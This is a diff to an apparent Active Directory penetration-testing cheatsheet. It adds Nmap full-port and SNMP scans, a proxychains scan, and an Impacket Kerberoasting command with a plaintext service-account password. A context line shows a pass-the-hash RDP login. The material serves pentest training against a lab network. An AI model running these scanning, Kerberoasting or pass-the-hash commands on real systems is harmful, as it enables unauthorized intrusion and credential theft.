@@ -41,15 +41,20 @@ tags:   [Cheatsheets, Tools, Active-Directory, Active-Directory-Enumeration, SMB
 nxc smb 172.16.150.0/24
 crackmapexec smb 172.16.150.0/24
 
+# Nmap Scan (Use -v verbose to see active ports before the scan is completed so we can start planning what we could do)
+nmap -A -p- 172.16.150.10 -v
+nmap -A -p- -T4 -Pn 172.16.150.10 -v
+nmap -A -p- -T4 -Pn 172.16.150.0/24 -v
+
 # Nmap ARP Discovery
 nmap -n -sn 172.16.150.0/24
 
-# Nmap Scan
-nmap -Pn -sT -T4 --top-ports 1000 172.16.150.0/24
-sudo nmap -Pn -sT -T4 --top-ports 1000 172.16.150.0/24
+# Nmap UDP SNMP
+sudo nmap -sU -p161 172.16.150.10 -v
+sudo nmap -sU -p161,162,10161,10162 172.16.150.10 -v
 
 # Nmap through Proxychains
-proxychains -q nmap -Pn -sT -T4 --top-ports 1000 172.16.150.0/24
+proxychains -q nmap -A -p- -T4 -Pn 172.16.150.10
 
 # To find out which host is the Domain Controller, look for these typical Domain Controller ports in Nmap the results:
 Port 53 - DNS
@@ -469,6 +474,8 @@ xfreerdp /u:Administrator /pth:'1a06b4248879e68a498d3bac51bf91c9' /v:172.16.150.
 ### Kerberoasting
 ```shell
 # Kerberoasting from Kali using Impacket-GetUserSPNs
+impacket-GetUserSPNs vorkharium.com/SVC_TGS:'Password123!' -dc-ip 172.16.150.10 -request
+
 impacket-GetUserSPNs -dc-ip 172.16.150.10 vorkharium.com/john -request-user jane
 
 # Kerberoasting from Windows Host using Rubeus.exe
